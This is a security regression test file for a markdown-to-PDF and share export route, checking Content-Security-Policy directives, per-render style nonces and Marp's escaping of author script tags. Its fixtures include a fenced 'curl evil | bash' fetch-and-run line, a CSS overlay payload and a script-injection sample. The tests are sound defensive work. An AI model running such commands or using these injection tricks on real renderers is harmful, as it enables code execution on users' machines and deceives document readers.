// The PDF route renders `marked.parse` output with NO sanitiser — unlike
// every view surface, which runs `sanitizeMarkdownHtml` — and hands it to
// Chromium via `page.setContent()`. So a `<script>` in a rendered `.md`
// executed and could rewrite the PDF it was being exported into (codex
// round 9).
//
// Two halves are pinned here, because the fix is deliberately asymmetric:
// the plain-markdown document forbids scripts, and the Marp document does
// NOT — it ships its own custom-elements polyfill and escapes author raw
// HTML instead of passing it through. If Marp ever stops escaping, the
// second test goes red and the asymmetry has to be revisited.

import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { renderMarpDeck } from "@mulmoclaude/markdown-plugin";
import { MARP_HTML_ALLOWLIST } from "@mulmoclaude/markdown-utils/markdown/marpTheme";
import { renderMarkdownHtml } from "../../server/api/routes/pdf.js";
import { withScriptCsp } from "../../server/api/routes/share.js";

const REPO_ROOT = path.resolve(fileURLToPath(new URL(".", import.meta.url)), "..", "..");
const PDF_ROUTE = readFileSync(path.join(REPO_ROOT, "server/api/routes/pdf.ts"), "utf8");

describe("the plain-markdown PDF document forbids scripts", () => {
  it("wrapHtml emits a Content-Security-Policy", async () => {
    // Against rendered output, not the source: the policy is assembled at
    // render time now that it carries a per-render nonce.
    const html = await renderMarkdownHtml({ markdown: "# T" });
    assert.match(html, /<meta http-equiv="Content-Security-Policy" content="[^"]+">/);
  });

  it("that policy blocks scripts, plugins, base rewriting and form posts", () => {
    const declared = /const NO_SCRIPT_CSP = "([^"]+)"/.exec(PDF_ROUTE);
    assert.ok(declared, "NO_SCRIPT_CSP must be a single literal the test can read");
    const policy = declared[1] ?? "";
    // `frame-src`/`child-src` are load-bearing, not decoration: measured in
    // Chromium, without them `<iframe src="data:text/html,…">` LOADS and
    // paints attacker content into the exported PDF.
    ["script-src 'none'", "object-src 'none'", "base-uri 'none'", "form-action 'none'", "frame-src 'none'", "child-src 'none'"].forEach((directive) => {
      assert.ok(policy.includes(directive), `missing ${directive}`);
    });
  });
});

describe("author <style> cannot restyle the exported document", () => {
  // The attribute policy cannot stop this one: a stylesheet is raw-text
  // content, which the scanner copies verbatim by design. Measured in
  // Chromium — without a style-src, `<style>pre::before{content:"npm
  // install";position:absolute;inset:0;background:white}</style>` renders
  // that text over the code block in the exported PDF (codex round 11).
  const PAYLOAD = ["# Doc", "", '<style>pre::before{content:"npm install"}</style>', "", "```sh", "curl evil | bash", "```"].join("\n");

  it("names a nonce in style-src, and the route's own stylesheet carries it", async () => {
    const html = await renderMarkdownHtml({ markdown: PAYLOAD });
    const inPolicy = /style-src 'nonce-([0-9a-f-]{36})'/.exec(html);
    const onTag = /<style nonce="([0-9a-f-]{36})">/.exec(html);
    assert.ok(inPolicy, "style-src must name a nonce");
    assert.ok(onTag, "the route's own <style> must carry one");
    assert.equal(onTag[1], inPolicy[1], "or the route's own CSS would be blocked too");
  });

  it("mints a FRESH nonce per render", async () => {
    // A constant in the source is one an attacker reads off GitHub — the
    // lesson the copy button's marker learned in #3142.
    const first = /nonce-([0-9a-f-]{36})/.exec(await renderMarkdownHtml({ markdown: "# A" }));
    const second = /nonce-([0-9a-f-]{36})/.exec(await renderMarkdownHtml({ markdown: "# A" }));
    assert.ok(first && second);
    assert.notEqual(first[1], second[1]);
  });

  it("blocks the author's stylesheet rather than deleting it", async () => {
    // The block stays in the document; the CSP is what makes it inert.
    // Asserting removal would pin the wrong mechanism.
    const html = await renderMarkdownHtml({ markdown: PAYLOAD });
    assert.match(html, /npm install/, "the payload is not stripped — the policy is what stops it");
    // The author's own `<style>` stays in the BODY, un-nonced and inert.
    // What must never happen is the ROUTE emitting an un-nonced one in the
    // head, which would mean its stylesheet was relying on `unsafe-inline`.
    const head = /<head>([\s\S]*?)<\/head>/.exec(html);
    assert.ok(head);
    const headStyles = [...(head[1] ?? "").matchAll(/<style\b([^>]*)>/g)].map((match) => match[1] ?? "");
    assert.equal(headStyles.length, 1, "the route emits exactly one stylesheet");
    assert.match(headStyles[0] ?? "", /nonce="/, "and it must be nonced");
  });
});

describe("what the SHARE zip inherits, and what it adds", () => {
  // share.ts used to claim it neutralised scripts "without stripping
  // content or touching images/styles". This PR made that false, and the
  // comment is now load-bearing documentation of an asymmetry — so the
  // structural facts behind it are pinned rather than left as prose
  // (codex round 12).
  it("a shared PLAIN document carries BOTH policies — they are each enforced", async () => {
    const shared = withScriptCsp(await renderMarkdownHtml({ markdown: "# T" }));
    const policies = shared.match(/Content-Security-Policy/g) ?? [];
    assert.equal(policies.length, 2, "the renderer's own policy plus share's extra one");
  });

  it("a shared MARP document carries share's policy alone — and that blocks Marp's own polyfill", async () => {
    // The Marp document ships no CSP of its own, deliberately, because the
    // in-app preview needs that polyfill. In a shared zip it is blocked.
    // The slides are static markup and still render. This trade predates
    // #3151; the test exists so nobody rediscovers it as a mystery.
    const deck = ["---", "marp: true", "---", "", "# Slide"].join("\n");
    const marpHtml = await renderMarkdownHtml({ markdown: deck, marp: true });
    assert.doesNotMatch(marpHtml, /Content-Security-Policy/, "the Marp document has no policy of its own");
    assert.match(marpHtml, /<script/i, "and it does ship a script");

    const shared = withScriptCsp(marpHtml);
    assert.equal((shared.match(/Content-Security-Policy/g) ?? []).length, 1);
    assert.match(shared, /script-src 'none'/);
  });
});

describe("the Marp document is exempt, and here is the assumption that makes it safe", () => {
  it("Marp escapes author SCRIPT tags", async () => {
    // Deliberately narrower than "Marp escapes author raw HTML", which is
    // FALSE for this repo: `MARP_HTML_ALLOWLIST` passes a layout subset
    // through on purpose (see the next test). The claim that lets the Marp
    // document keep JavaScript enabled for its own polyfill is only about
    // `<script>`. A Marp upgrade that stops escaping it turns this red.
    const deck = ["---", "marp: true", "---", "", "# Slide", "", "<script>window.EVIL=1</script>", "", "after"].join("\n");
    const { html } = await renderMarpDeck(deck, { themes: [], inlineSVG: true });
    assert.match(html, /&lt;script&gt;/, "Marp must escape author script tags");
    assert.doesNotMatch(html, /<script[^>]*>\s*window\.EVIL/, "an author script must never become executable markup");
  });

  it("the allowlist passes LAYOUT tags only — never anything interactive", async () => {
    // The other half of the exemption, and the half I originally got
    // wrong. Marp is handed an explicit allowlist, so "what author HTML
    // survives" is a decision this repo makes, not a Marp default. This
    // pins the decision: layout tags with layout attributes, and nothing
    // that executes, navigates, or embeds.
    const tags = Object.keys(MARP_HTML_ALLOWLIST).sort();
    assert.deepEqual(tags, ["br", "div", "img", "small", "span", "sub", "sup"]);

    const forbidden = ["script", "iframe", "object", "embed", "form", "input", "button", "a", "style", "link", "base"];
    forbidden.forEach((tag) => assert.ok(!(tag in MARP_HTML_ALLOWLIST), `${tag} must never be allowlisted`));

    Object.entries(MARP_HTML_ALLOWLIST).forEach(([tag, attrs]) => {
      attrs.forEach((attr) => {
        assert.ok(!attr.toLowerCase().startsWith("on"), `${tag} must not allow the event-handler attribute ${attr}`);
        assert.ok(
          !["src", "href", "srcdoc", "formaction"].includes(attr.toLowerCase()) || tag === "img",
          `${tag} must not allow the navigating/embedding attribute ${attr}`,
        );
      });
    });
  });

  it("Marp ships exactly one script of its own, which is why it is not blanket-blocked", async () => {
    const deck = ["---", "marp: true", "---", "", "# Slide"].join("\n");
    const { html } = await renderMarpDeck(deck, { themes: [], inlineSVG: true });
    const scripts = [...html.matchAll(/<script[^>]*>/gi)];
    assert.equal(scripts.length, 1, "if Marp stops needing its polyfill, the Marp document should get the CSP too");
  });
});
